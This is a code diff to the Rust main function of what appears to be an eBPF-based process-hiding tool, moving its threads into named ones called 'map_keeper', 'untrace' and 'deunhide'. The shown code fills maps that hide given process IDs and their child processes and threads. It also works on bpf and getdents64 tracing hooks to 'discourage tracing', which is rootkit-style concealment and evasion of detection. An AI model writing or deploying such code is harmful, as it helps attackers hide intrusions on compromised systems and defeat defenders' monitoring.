@@ -141,8 +141,9 @@ async fn main() -> anyhow::Result<()> {
     }
 
     // keep skip-maps updated
-    thread::spawn({
-        move || loop {
+    let _ = thread::Builder::new()
+        .name("map_keeper".to_string())
+        .spawn(move || loop {
             thread::sleep(Duration::from_millis(1000));
             let mut prev_id: u32 = 0;
             let active_programs = list_active_programs();
@@ -196,40 +197,12 @@ async fn main() -> anyhow::Result<()> {
                 }
                 prev_id = *m;
             }
-        }
-    });
-    thread::spawn(move || {
-        // wait for last thread (tokio loop) to start
-        thread::sleep(Duration::from_millis(1000));
-
-        // setup pid/thread trees to hide
-        let mut sys = System::new_all();
-        let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
-
-        for p in pid.iter() {
-            info!("pid: {p} -> hide");
-            hidden_pids_map
-                .insert(p, 0, 0)
-                .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
-            let (children_pid, children_threads) = get_descendants(&sys, Pid::from(*p as usize));
-            for child in children_pid.iter() {
-                hidden_pids_map
-                    .insert(child.as_u32(), 0, 0)
-                    .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
-            }
-            for child in children_threads.iter() {
-                hidden_threads_map
-                    .insert(child.as_u32(), 0, 0)
-                    .unwrap_or_else(|_| {
-                        panic!("TOO MANY THREADS PROVIDED (max {MAX_HIDDEN_PIDS})")
-                    });
-            }
-        }
-    });
+        });
 
     // discourage tracing
-    thread::spawn({
-        move || loop {
+    let _ = thread::Builder::new()
+        .name("untrace".to_string())
+        .spawn(move || loop {
             thread::sleep(Duration::from_millis(250));
             for syscall in ["bpf", "getdents64"] {
                 for hook in ["enter", "exit"] {
@@ -243,8 +216,37 @@ async fn main() -> anyhow::Result<()> {
                     };
                 }
             }
-        }
-    });
+        });
+    let _ = thread::Builder::new()
+        .name("deunhide".to_string())
+        .spawn(move || {
+            // setup pid/thread trees to hide
+            let mut sys = System::new_all();
+            let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
+
+            for p in pid.iter() {
+                info!("pid: {p} -> hide");
+                hidden_pids_map
+                    .insert(p, 0, 0)
+                    .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
+                let (children_pid, children_threads) =
+                    get_descendants(&sys, Pid::from(*p as usize));
+                for child in children_pid.iter() {
+                    hidden_pids_map
+                        .insert(child.as_u32(), 0, 0)
+                        .unwrap_or_else(|_| {
+                            panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})")
+                        });
+                }
+                for child in children_threads.iter() {
+                    hidden_threads_map
+                        .insert(child.as_u32(), 0, 0)
+                        .unwrap_or_else(|_| {
+                            panic!("TOO MANY THREADS PROVIDED (max {MAX_HIDDEN_PIDS})")
+                        });
+                }
+            }
+        });
     let ctrl_c = signal::ctrl_c();
     ctrl_c.await?;
     println!("Exiting...");
